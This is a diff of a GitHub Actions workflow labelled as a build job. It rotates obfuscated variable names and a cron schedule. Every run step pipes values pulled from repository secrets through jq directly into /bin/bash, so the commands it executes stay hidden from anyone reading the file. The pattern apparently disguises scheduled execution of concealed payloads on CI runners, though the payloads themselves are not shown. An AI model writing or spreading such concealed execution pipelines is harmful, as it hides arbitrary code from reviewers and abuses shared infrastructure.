@@ -2,22 +2,23 @@ name: laicongchu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 5/6 * * *'
-
+    - cron: '32 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: laicongchu
         env:
-          mkvc7708: ${{ secrets.mkvc7708 }}
+          ndgu330: ${{ secrets.ndgu330 }}
         run: |
-          echo $mkvc7708 | jq -r .va0436 | /bin/bash
-          echo $mviii910 | jq -r .bhw445 | /bin/bash
-          echo $rsxqz594 | jq -r .ys1756 | /bin/bash
-          echo $blne4 | jq -r .kgwhx66489 | /bin/bash
-          echo $gvj05384 | jq -r .vcc03 | /bin/bash
-          echo $q577 | jq -r .qx6841 | /bin/bash
-          echo $lz358 | jq -r .bict3 | /bin/bash
+          echo $ndgu330 | jq -r .flzm4 | /bin/bash
+          echo $cb0 | jq -r .jymt230 | /bin/bash
+          echo $yxhw9 | jq -r .cn11206 | /bin/bash
+          echo $fmfmk8199 | jq -r .tqxpn3410 | /bin/bash
+          echo $v16871 | jq -r .gry41904 | /bin/bash
+          echo $jp7 | jq -r .rhruu40 | /bin/bash
+          echo $mv7177 | jq -r .uehx67792 | /bin/bash
+          echo $mg9 | jq -r .uf7127 | /bin/bash
 
